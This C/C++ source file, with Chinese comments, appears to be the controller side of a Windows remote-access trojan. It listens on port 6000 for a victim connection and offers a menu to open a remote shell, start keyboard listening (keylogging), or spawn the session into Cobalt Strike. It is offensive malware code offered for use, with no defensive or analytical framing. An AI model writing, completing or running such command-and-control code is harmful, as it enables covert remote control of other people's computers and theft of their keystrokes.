#define _CRT_SECURE_NO_WARNINGS 1
#include <WinSock2.h>
#include <windows.h>
#pragma comment(lib,"ws2_32.lib")
#include <stdio.h>
#include <Ws2tcpip.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <cstdio> 
#include "baseFunction.h"
#include "choice.h"
#define MSG_LEN 10244

int main() {
	int err;
	char sendChar[MSG_LEN];
	char recvChar[MSG_LEN];
	SOCKET sockServer;
	SOCKET sockClient;
	SOCKADDR_IN addrServer;
	SOCKADDR_IN addrClient;
	char clientIp[20];
	char *customChar;

	WSADATA wsaData;
	WORD wVersionRequested;

	//配置 Windows Sokcet版本
	wVersionRequested = MAKEWORD(2, 2);

	//初始化 Windows Sockert
	err = WSAStartup(wVersionRequested, &wsaData);

	if (err != 0) {
		printf(TEXT("Windows Socket初始化失败"));
		return 0;
	}

	/*确认WinSock DLL支持2.2*/
	sockServer = socket(AF_INET, SOCK_STREAM, 0);
	sockClient = socket(AF_INET, SOCK_STREAM, 0);
	addrServer.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrServer.sin_family = AF_INET;
	addrServer.sin_port = htons(6000);

	//将服务端socket和地址端口绑定
	bind(sockServer, (SOCKADDR *)&addrServer, sizeof(SOCKADDR));

	//listen监听端口
	listen(sockServer, 5);
	printf("服务器已启动，监听中......\n");

	int len = sizeof(SOCKADDR);

	//accept会阻塞进程直到有客户端连接

	sockClient = accept(sockServer, (SOCKADDR *)&addrClient, &len);
	inet_ntop(AF_INET, &addrClient.sin_addr, clientIp, 20);
	//sprintf_s(sendChar, "欢迎ip:%s 用户连接服务端!", clientIp);
	printf("欢迎ip:%s 用户连接服务端!\n", clientIp);
	//send(sockClient, sendChar, strlen(sendChar) + 1, 0);
	customChar = (char *)malloc(MSG_LEN);
	while (1) {
		printf("1、输入shell进入shell模式\n2、输入keyboardListen开启键盘监听\n3、输入SpawnCS将shell派生之Cobalt Strike:\n");
	fgets(customChar, MSG_LEN, stdin);
	trim(customChar);
	
		if (strcmp(customChar, "shell") == 0) {
			//printf("shell开动\n");
			dealShell(sockClient);
		}
		else if (strcmp(customChar, "SpawnCS") == 0) {
			printf("SpawnCS开动");
			dealSpawn(sockClient);
		}
		else if (strcmp(customChar, "keyboardListen") == 0) {
			printf("keyboardListen开动");
		}
		else {
			printf("请输入正确的选项");
		}
	}
	/*
	while (1)
	{
		ZeroMemory(customChar, MSG_LEN);
		
		printf("请输入命令:");
		fgets(customChar, MSG_LEN, stdin);

		
		send(sockClient, customChar, MSG_LEN, 0);
		recv(sockClient, recvChar, MSG_LEN, 0);
		puts(recvChar);
		ZeroMemory(recvChar, MSG_LEN);
	}
	closesocket(sockClient);
	*/

	system("pause");
	closesocket(sockClient);
	return 0;
}